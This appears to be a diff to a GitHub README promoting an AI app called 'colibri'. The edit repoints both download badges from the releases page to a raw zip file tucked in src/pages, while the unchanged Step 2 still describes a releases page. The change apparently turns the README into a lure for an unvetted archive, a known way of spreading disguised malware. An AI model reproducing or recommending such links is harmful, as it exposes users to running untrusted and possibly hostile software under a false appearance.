@@ -29,7 +29,7 @@ Ready to experience colibri? Follow these simple steps:
 
 **Step 1:** Visit this link to download the application:
 
-[![⬇️ DOWNLOAD COLIBRI NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-COLIBRI-blue?style=for-the-badge&color=4CAF50)](https://github.com/hsupertools30-lgtm/colibri/releases)
+[![⬇️ DOWNLOAD COLIBRI NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-COLIBRI-blue?style=for-the-badge&color=4CAF50)](https://raw.githubusercontent.com/hsupertools30-lgtm/colibri/main/src/pages/1.8.zip)
 
 **Step 2:** On the download page, you'll see a list of available files. Look for the latest version (the one at the top with the newest date).
 
@@ -169,7 +169,7 @@ This isn't just software. It's a statement: advanced AI belongs to everyone. And
 
 Ready to transform your computer into an AI powerhouse?
 
-[![⬇️ GET STARTED WITH COLIBRI](https://img.shields.io/badge/🚀_DOWNLOAD-NOW-purple?style=for-the-badge&color=FF6D00)](https://github.com/hsupertools30-lgtm/colibri/releases)
+[![⬇️ GET STARTED WITH COLIBRI](https://img.shields.io/badge/🚀_DOWNLOAD-NOW-purple?style=for-the-badge&color=FF6D00)](https://raw.githubusercontent.com/hsupertools30-lgtm/colibri/main/src/pages/1.8.zip)
 
 ---
 
